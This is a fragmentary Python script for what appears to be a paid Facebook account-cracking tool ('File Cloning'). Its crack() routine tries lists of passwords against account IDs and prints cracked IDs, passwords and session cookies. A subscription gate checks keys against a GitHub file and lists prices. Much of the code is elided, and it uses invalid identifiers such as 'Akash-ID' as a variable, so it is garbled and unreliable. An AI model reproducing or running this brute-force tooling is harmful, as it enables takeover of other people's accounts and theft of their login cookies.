...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mAkash-ID')
...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'Akash-ID' and password == 'Love':
...
os.system('xdg-open https://www.facebook.com/Akash-ID.King.Ok.Bro')
def banner():
	os.system("clear")
	print (f"""
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
...
def login():
	banner()
	Akash-IDj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	Akash-IDj('\033[0;97m===============================================')
	Akash-ID= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if Akash-ID in ['m']:
		public()
	elif Akash-ID in ['1']:
		crack_file()
	elif Akash-ID in ['i','0i']:
		result()
	elif Akash-ID in ['2','02']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[Akash-ID] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
			    #Akash
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•Akash-ID-Cp] {idf} • {pw}')     
				...
				#Akash
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•Akash-ID-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " Akash-ID,  Ok,  id"')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/Akash-Cyber-404/Akash-Paid/blob/main/Approval.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m Akash-ID King, ToOLs Daily Update")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+Akash-ID+key1)
		...
		time.sleep(3.5)
		tks = 'Assalamu%20Alaikum-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+Akash-ID+''+key1
